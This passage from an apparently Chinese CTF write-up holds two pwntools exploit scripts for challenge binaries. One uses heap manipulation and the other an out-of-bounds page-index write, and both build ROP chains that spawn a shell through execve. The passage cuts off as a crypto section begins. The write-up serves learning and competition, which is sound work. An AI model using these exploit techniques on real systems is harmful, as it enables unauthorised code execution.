</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span><span class=o>&gt;=</span><span class=mi>4</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;ontent: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=p>(</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rm</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Choose an option: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Choose an option: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;---</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>([])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>note_system</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x5f7</span><span class=p>,</span><span class=s1>&#39;H&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mh>0x17</span><span class=p>,</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x17</span><span class=p>,</span><span class=s1>&#39;B&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rm</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x567</span><span class=p>,</span><span class=s1>&#39;E&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Choose an option: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;shout:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mh>0x23</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p8</span><span class=p>(</span><span class=mh>0x37</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p8</span><span class=p>(</span><span class=mh>0x6a</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#gdb.attach(io,gdbscript=gdbscript)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>note_system</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>heap_addr</span> <span class=o>=</span>  <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>lss</span><span class=p>(</span><span class=s1>&#39;heap_addr&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mh>0x600</span><span class=p>,</span><span class=s1>&#39;hehe&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=mh>0x600</span><span class=p>,</span><span class=s1>&#39;hehe&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rm</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_addr</span><span class=o>+</span><span class=mh>0x10</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_addr</span><span class=o>-</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>6</span><span class=p>,</span><span class=mh>0x17</span><span class=p>,</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span>  <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x203f90</span>
</span></span><span class=line><span class=cl><span class=n>lss</span><span class=p>(</span><span class=s1>&#39;libc_base&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rm</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>libc_base</span>
</span></span><span class=line><span class=cl><span class=n>system</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>bin_sh</span> <span class=o>=</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;/bin/sh&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>poprdi</span> <span class=o>=</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=s1>&#39;pop rdi;ret&#39;</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=n>poprsi</span> <span class=o>=</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=s1>&#39;pop rsi;ret&#39;</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x17</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x414243</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x2a871</span><span class=p>))</span> <span class=c1># pop </span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rop</span>  <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>poprdi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>bin_sh</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>poprsi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x00000000000b503c</span> <span class=o>+</span> <span class=n>libc_base</span><span class=p>)</span> <span class=c1># pop rdx</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>5</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;execve&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0xf</span><span class=p>,</span><span class=mh>0x600</span><span class=p>,</span><span class=n>rop</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=s1>&#39;6&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#pay = b&#39;ABC&#39;</span>
</span></span><span class=line><span class=cl><span class=c1>#add(7,0x40,pay)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#ru(&#39;Choose an option: &#39;)</span>
</span></span><span class=line><span class=cl><span class=c1>#sl(&#39;4&#39;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>itr</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=library>Library</h2><p>漏洞在功能3，没有限制 page 的索引，可以任意偏移写</p><p><img src=https://su-team.cn/img/2025-L3HCTF/d7301785-2a38-426f-a78d-fc411ce3be78.png alt=img></p><p>本地测试发现 编辑写入的数据所在的段有两种情况，在heap 下面的时候， 他会和其他线程的stack 地址有固定偏移</p><p><img src=https://su-team.cn/img/2025-L3HCTF/e70cbba8-2e31-413e-89a9-00a9342f6c42.png alt=img></p><p><img src=https://su-team.cn/img/2025-L3HCTF/711fc631-ad5b-42e9-b0cc-837a046e84d1.png alt=img></p><p><img src=https://su-team.cn/img/2025-L3HCTF/dec030ad-b986-482e-86f3-aa899ffd8cfa.png alt=img></p><p>后面直接写rop 就行了，elf 里面gadget 足够用了，还有 syscall</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=c1>#from ctypes import CDLL</span>
</span></span><span class=line><span class=cl><span class=c1>#cdl = CDLL(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>s</span>    <span class=o>=</span> <span class=k>lambda</span>   <span class=n>x</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sa</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>y</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span>   <span class=o>=</span> <span class=k>lambda</span>   <span class=n>x</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span>  <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>y</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span>    <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rl</span>   <span class=o>=</span> <span class=k>lambda</span>     <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>itr</span>  <span class=o>=</span> <span class=k>lambda</span>     <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>uu32</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>u32</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>uu64</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>u64</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>ls</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>lss</span>  <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>ls</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\033</span><span class=s1>[1;31;40m</span><span class=si>%s</span><span class=s1> -&gt; 0x</span><span class=si>%x</span><span class=s1> </span><span class=se>\033</span><span class=s1>[0m&#39;</span> <span class=o>%</span> <span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=nb>eval</span><span class=p>(</span><span class=n>x</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>attack</span> <span class=o>=</span> <span class=s1>&#39;1.95.8.146:25314&#39;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>,</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=s1>&#39;./library.kexe&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>(</span><span class=n>argv</span><span class=o>=</span><span class=p>[],</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span><span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span><span class=n>gdbscript</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>TAG</span><span class=p>:</span><span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=o>*</span><span class=n>args</span><span class=o>.</span><span class=n>TAG</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>REM</span><span class=p>:</span><span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=o>*</span><span class=n>attack</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>process</span><span class=p>([</span><span class=n>binary</span><span class=p>]</span> <span class=o>+</span> <span class=n>argv</span><span class=p>,</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#context(arch=&#39;amd64&#39;, log_level = &#39;debug&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>binary</span> <span class=o>=</span> <span class=n>binary</span><span class=p>,</span> <span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=n>terminal</span><span class=o>=</span><span class=s1>&#39;tmux splitw -h -l 170&#39;</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1>#libc = context.binary.libc</span>
</span></span><span class=line><span class=cl><span class=c1>#elf  = ELF(binary)</span>
</span></span><span class=line><span class=cl><span class=c1>#print(context.binary.libs)</span>
</span></span><span class=line><span class=cl><span class=c1>#libc = ELF(&#39;./libc.so.6&#39;)</span>
</span></span><span class=line><span class=cl><span class=c1>#import socks</span>
</span></span><span class=line><span class=cl><span class=c1>#context.proxy = (socks.SOCKS5, &#39;192.168.31.251&#39;, 10808)</span>
</span></span><span class=line><span class=cl><span class=n>gdbscript</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>b *0x23d8a2
</span></span></span><span class=line><span class=cl><span class=s1>b *0x0252416
</span></span></span><span class=line><span class=cl><span class=s1>#continue
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=o>**</span><span class=nb>locals</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=c1>#import os</span>
</span></span><span class=line><span class=cl><span class=c1>#os.systimport os</span>
</span></span><span class=line><span class=cl><span class=c1>#io = remote(*attack.split(&#39;:&#39;))</span>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>([])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>name</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Your choice: </span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;borrow?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=n>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span><span class=n>page</span><span class=p>,</span><span class=n>text</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Your choice: </span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;read?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;page: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>page</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;write: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=p>(</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=s1>&#39;hack1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=s1>&#39;BBBBBBB&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#gdb.attach(io,gdbscript)</span>
</span></span><span class=line><span class=cl><span class=n>rax</span> <span class=o>=</span> <span class=mh>0x000000000024600f</span> <span class=c1># pop rax ; ret</span>
</span></span><span class=line><span class=cl><span class=n>rdi</span> <span class=o>=</span> <span class=mh>0x0000000000227871</span> <span class=c1># pop rdi ; ret</span>
</span></span><span class=line><span class=cl><span class=n>rsi</span> <span class=o>=</span> <span class=mh>0x000000000022727d</span> <span class=c1># pop rsi ; ret</span>
</span></span><span class=line><span class=cl><span class=n>rdx</span> <span class=o>=</span> <span class=mh>0x00000000002539c4</span> <span class=c1># pop rdx ; ret</span>
</span></span><span class=line><span class=cl><span class=n>mov_rsi_rdx</span> <span class=o>=</span> <span class=mh>0x0000000000252d4c</span> <span class=c1># mov qword ptr [rsi], rdx ; ret</span>
</span></span><span class=line><span class=cl><span class=n>syscall</span> <span class=o>=</span>  <span class=mh>0x25FC90</span>
</span></span><span class=line><span class=cl><span class=n>pay</span>  <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=n>rdx</span><span class=p>,</span><span class=mh>0x68732f6e69622f</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>rsi</span><span class=p>,</span><span class=mh>0x26e7b8</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>mov_rsi_rdx</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>rdi</span><span class=p>,</span><span class=mh>0x3b</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>rsi</span><span class=p>,</span><span class=mh>0x26e7b8</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>rdx</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>syscall</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>pay</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x218198</span><span class=o>+</span><span class=n>i</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>pay</span><span class=p>[</span><span class=n>i</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sleep</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>itr</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=https://su-team.cn/img/2025-L3HCTF/8564e85a-08de-48c4-bf7a-6e49ce112132.png alt=img></p><h1 id=crypto>Crypto</h1><h2 id=math_problem>math_problem</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>gmpy2</span>  
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>gmpy2</span> <span class=kn>import</span> <span class=o>*</span>  
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>  
